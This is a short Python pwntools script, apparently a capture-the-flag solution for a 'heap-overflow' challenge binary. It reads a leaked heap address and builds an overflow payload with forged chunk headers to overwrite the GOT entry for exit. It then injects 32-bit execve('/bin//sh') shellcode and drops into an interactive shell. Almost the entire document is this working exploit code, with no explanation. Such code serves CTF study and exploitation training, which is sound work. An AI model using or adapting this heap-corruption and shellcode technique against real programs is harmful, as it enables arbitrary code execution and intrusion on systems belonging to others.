from pwn import *

shellcode = "\xeb\x0bssppppffff\xcc\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
path = "/problems/heap-overflow_5_39d709fdc06b81d3c23b73bb9cca6bdb"
elf = ELF("{}/vuln".format(path))
sock = process("{}/vuln".format(path), cwd=path)
#elf = ELF("./vuln")
#sock = process("./vuln")

sock.recvline()
addr_heap = int(sock.recvline())

sock.recvline()
size = 0x298 + 0x50
"""
payload = 'AAAABBBB'
payload += p32(elf.got['exit'] - 0xc) + p32(addr_heap + 0x10)
payload += shellcode
payload += 'A' * (0x298 - len(payload))
payload += p32(0) + p32(0x49)
payload += 'A' * (size - len(payload))
payload += p32(size) + p32(0xfffffffc)
payload += p32(elf.got['exit'] - 0xc) + p32(addr_heap + 0x10)
"""
payload = 'A' * 0x298
payload += p32(0) + p32(0x49)
payload += p32(elf.got['exit'] - 0xc) + p32(addr_heap + 0x2a8 + 0x8)
payload += p32(elf.got['exit'] - 0xc) + p32(addr_heap + 0x2a8 + 0x8)
payload += shellcode
payload += 'A' * (0x298 + 0x48 - len(payload))
payload += p32(0x2e8) + p32(0)
payload += p32(elf.got['exit'] - 0xc) + p32(addr_heap + 0x2a8 + 0x8)
assert '\n' not in payload
sock.sendline(payload)
sock.recvline()
_ = raw_input()
payload = '11112222'
sock.sendline(payload)

sock.interactive()
